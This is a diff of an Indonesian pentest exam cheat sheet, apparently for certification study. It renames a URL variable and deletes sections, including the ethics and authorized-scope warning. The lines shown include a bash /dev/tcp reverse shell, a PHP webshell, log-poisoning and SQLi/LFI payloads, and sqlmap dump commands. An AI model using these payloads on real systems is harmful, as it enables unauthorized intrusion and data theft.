@@ -1,6 +1,6 @@
 # Pentest Closed-Book Cheat Sheet
 > **Playbook ujian: Target → Foothold → Root → FLAG**  
-> Untuk laboratorium, CTF, mesin ujian, dan sistem yang telah memberikan izin tertulis.
+> Untuk persiapan Sertifikasi Pentester BSSN
 
 ---
 
@@ -32,17 +32,6 @@ FIND FLAG
 PROOF
 ```
 
-## Mnemonic
-
-```text
-D-S-E-F-S-T-E-P-R-F
-```
-
-```text
-Discover → Scan → Enumerate → Foothold → Shell
-→ TTY → Enumerate Local → PrivEsc → Root → Flag
-```
-
 ## Prinsip setiap tahap
 
 ```text
@@ -70,7 +59,7 @@ TARGET="192.168.56.118"
 LHOST="192.168.56.101"
 LPORT="4444"
 PORT="8080"
-BASE="http://$TARGET:$PORT"
+WEB="http://$TARGET:$PORT"
 ```
 
 Verifikasi:
@@ -78,7 +67,7 @@ Verifikasi:
 ```bash
 echo "$TARGET"
 echo "$LHOST"
-echo "$BASE"
+echo "$WEB"
 ```
 
 ## Arti variabel
@@ -89,7 +78,7 @@ echo "$BASE"
 | `LHOST` | IP Kali yang dapat dijangkau target |
 | `LPORT` | port listener reverse shell |
 | `PORT` | port aplikasi target |
-| `BASE` | base URL aplikasi |
+| `WEB` | base URL aplikasi |
 
 ---
 
@@ -169,20 +158,20 @@ Tidak semua target adalah web. Pilih jalur berdasarkan service.
 ## 4.1 HTTP/HTTPS
 
 ```bash
-curl -I "$BASE"
-curl -s "$BASE"
+curl -I "$WEB"
+curl -s "$WEB"
 ```
 
 Cek teknologi:
 
 ```bash
-whatweb "$BASE"
+whatweb "$WEB"
 ```
 
 Cek robots:
 
 ```bash
-curl -s "$BASE/robots.txt"
+curl -s "$WEB/robots.txt"
 ```
 
 ## 4.2 FTP
@@ -234,14 +223,14 @@ nc -nv "$TARGET" <PORT>
 ## 5.1 Directory brute force
 
 ```bash
-dirsearch -u "$BASE/"
+dirsearch -u "$WEB/"
 ```
 
 ## 5.2 Extension penting
 
 ```bash
 feroxbuster \
-  -u "$BASE/" \
+  -u "$WEB/" \
   -w /usr/share/wordlists/dirb/common.txt \
   -x php,txt,bak,old,zip,sql,conf,env
 ```
@@ -349,7 +338,7 @@ Jika hasil berbeda secara konsisten, lanjutkan validasi.
 Siapkan URL:
 
 ```bash
-URL="$BASE/page?id=1"
+URL="$WEB/page?id=1"
 ```
 
 ### 1. Deteksi SQL Injection
@@ -421,7 +410,7 @@ sqlmap -u "$URL" -p id --batch -D <DATABASE> -T <TABLE> --dump
 Siapkan:
 
 ```bash
-LOGIN_URL="$BASE/administrator/"
+LOGIN_URL="$WEB/administrator/"
 POST_DATA="username=admin&password=test"
 ```
 
@@ -578,7 +567,7 @@ GIF89a;
 ## 8.5 Uji webshell
 
 ```bash
-curl "$BASE/uploads/shell.php?cmd=id"
+curl "$WEB/uploads/shell.php?cmd=id"
 ```
 
 URL encode command:
@@ -586,7 +575,7 @@ URL encode command:
 ```bash
 curl -G \
   --data-urlencode "cmd=id" \
-  "$BASE/uploads/shell.php"
+  "$WEB/uploads/shell.php"
 ```
 
 ## Decision tree
@@ -696,7 +685,7 @@ Inject User-Agent:
 ```bash
 curl \
   -A "<?php system(\$_GET['cmd']); ?>" \
-  "$BASE/"
+  "$WEB/"
 ```
 
 Include log:
@@ -1482,10 +1471,6 @@ ls -la /tmp
 find / -type f -iname "flag*" 2>/dev/null
 ```
 
-```bash
-find / -type f \( -iname "*flag*" -o -iname "proof.txt" -o -iname "root.txt" -o -iname "user.txt" \) 2>/dev/null
-```
-
 ## 24.3 Cari pola umum CTF
 
 ```bash
@@ -1535,16 +1520,6 @@ strings <PATH>
 6. grep pola FLAG
 ```
 
-## Wajib hafal
-
-```bash
-find / -type f -iname "flag*" 2>/dev/null
-```
-
-```bash
-find / -type f \( -iname "*flag*" -o -iname "proof.txt" -o -iname "root.txt" -o -iname "user.txt" \) 2>/dev/null
-```
-
 ---
 
 # 25. Tahap 12 — Proof / Submission
@@ -1590,7 +1565,7 @@ cat <PATH_FLAG>
 TARGET="192.168.56.118"
 LHOST="192.168.56.101"
 PORT="8080"
-BASE="http://$TARGET:$PORT"
+WEB="http://$TARGET:$PORT"
 
 # =========================================================
 # 2. DISCOVER
@@ -1601,29 +1576,28 @@ nmap -sn 192.168.56.0/24
 # =========================================================
 # 3. SCAN
 # =========================================================
-nmap -p- --min-rate 5000 -T4 "$TARGET" -oN all-ports.txt
-nmap -sC -sV -p22,80,8080 "$TARGET" -oN service-scan.txt
+nmap -sC -sV -p- "$TARGET"
 
 # =========================================================
 # 4. WEB ENUM
 # =========================================================
-curl -s "$BASE/robots.txt"
-dirsearch -u "$BASE/"
-feroxbuster -u "$BASE/" -w /usr/share/wordlists/dirb/common.txt
+curl -s "$WEB/robots.txt"
+dirsearch -u "$WEB/"
+feroxbuster -u "$WEB/" -w /usr/share/wordlists/dirb/common.txt
 
 # =========================================================
 # 5. TEST FOOTHOLD
 # =========================================================
-# SQLi   : ' OR '1'='1'-- -
-# LFI    : ?page=../../../../etc/passwd
-# SSTI   : {{7*7}}
-# CMDi   : ; id
-# Upload : <?php system($_GET['cmd']); ?>
+SQLi   : 'OR'1'='1
+LFI    : ?page=../../../../etc/passwd
+SSTI   : {{7*7}}
+CMDi   : ; id
+Upload : <?php system($_GET['cmd']); ?>
 
 # =========================================================
 # 6. SQLMAP EXAMPLE
 # =========================================================
-URL="$BASE/page?id=1"
+URL="$WEB/page?id=1"
 sqlmap -u "$URL" -p id --batch
 sqlmap -u "$URL" -p id --batch --current-db
 sqlmap -u "$URL" -p id --batch --dbs
@@ -1675,7 +1649,7 @@ id; whoami; hostname; pwd
 # 13. FIND FLAG
 # =========================================================
 ls -la /root /home /home/* /var/www /opt 2>/dev/null
-find / -type f \( -iname "*flag*" -o -iname "proof.txt" -o -iname "root.txt" -o -iname "user.txt" \) 2>/dev/null
+find / -type f -iname "flag*" 2>/dev/null
 
 # =========================================================
 # 14. PROOF
@@ -1757,7 +1731,7 @@ cat <PATH_FLAG>
 ip a
 nmap -sn 192.168.56.0/24
 nmap -sC -sV -p- "$TARGET"
-dirsearch -u "$BASE/"
+dirsearch -u "$WEB/"
 nc -lvnp 4444
 bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'
 python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -1811,13 +1785,13 @@ nmap -sC -sV -p<PORTS> "$TARGET" -oN service-scan.txt
 ## Q3 — Directory enumeration?
 
 ```bash
-dirsearch -u "$BASE/"
+dirsearch -u "$WEB/"
 ```
 
 ## Q4 — SQLi login dasar?
 
 ```text
-' OR '1'='1'-- -
+'OR'1'='1'
 ```
 
 ## Q5 — SQLMap urutan?
@@ -1983,147 +1957,7 @@ cat <PATH_FLAG>
 
 ---
 
-# 31. Kesalahan Umum
-
-## Recon
-
-```text
-- tidak scan -p-;
-- hanya fokus port 80;
-- lupa menyimpan output;
-- salah menentukan LHOST.
-```
-
-## Web
-
-```text
-- tidak cek robots.txt;
-- tidak menangkap POST di Burp;
-- tidak mencari lokasi file upload;
-- tidak memeriksa parameter GET.
-```
-
-## SQLMap
-
-```text
-- URL tidak memiliki parameter;
-- salah memilih -p;
-- lupa --data untuk POST;
-- spasi setelah backslash;
-- langsung dump tanpa tahu database/tabel.
-```
-
-## Reverse Shell
-
-```text
-- listener belum aktif;
-- LHOST salah;
-- port berbeda;
-- quote rusak;
-- target tidak dapat callback.
-```
-
-## Enumeration
-
-```text
-- hanya menjalankan LinPEAS;
-- lupa sudo -l;
-- lupa getcap;
-- tidak cek permission script cron;
-- tidak enum ulang setelah pindah user.
-```
-
-## PrivEsc
-
-```text
-- kernel exploit terlalu cepat;
-- lupa -p pada SUID shell;
-- percaya semua temuan LinPEAS;
-- tidak verifikasi dengan id.
-```
-
-## Flag
-
-```text
-- hanya mencari flag.txt;
-- lupa /root, /home, /var/www, /opt;
-- menemukan file tetapi tidak cat;
-- screenshot tidak memuat isi flag.
-```
-
----
-
-# 32. Template Catatan Ujian
-
-```markdown
-# Target
-
-- TARGET:
-- LHOST:
-- Hostname:
-- OS:
-- Kernel:
-
-# Ports
-
-| Port | Service | Version | Notes |
-|---:|---|---|---|
-
-# Web
-
-- Base URL:
-- Endpoint:
-- Parameter:
-- Login:
-- Upload path:
-- Credential:
-
-# Foothold
-
-- Vulnerability:
-- Detection:
-- Exploit:
-- Initial user:
-
-# Reverse Shell
-
-- Listener:
-- Payload:
-- TTY:
-
-# Local Enumeration
-
-- sudo:
-- SUID:
-- capabilities:
-- cron:
-- writable:
-- credential:
-- internal service:
-
-# Privilege Escalation
-
-- Finding:
-- Exploit:
-- Root verification:
-
-# Flag
-
-- Path:
-- Value:
-
-# Proof
-
-```bash
-id
-hostname
-cat <PATH_FLAG>
-```
-```
-
----
-
-# 33. Ringkasan Satu Halaman
+# 31. Ringkasan Satu Halaman
 
 ```text
 DISCOVER
@@ -2196,14 +2030,3 @@ PROOF
 ```
 
 ---
-
-# 34. Etika dan Ruang Lingkup
-
-Gunakan materi ini hanya pada:
-
-- mesin laboratorium pribadi;
-- CTF;
-- mesin ujian;
-- sistem dengan izin tertulis.
-
-Jangan menjalankan payload pada sistem publik atau milik organisasi tanpa otorisasi. Perubahan cron, SUID, `/etc/passwd`, dan kernel exploit dapat merusak sistem. Gunakan snapshot pada laboratorium sebelum menjalankan teknik berisiko.
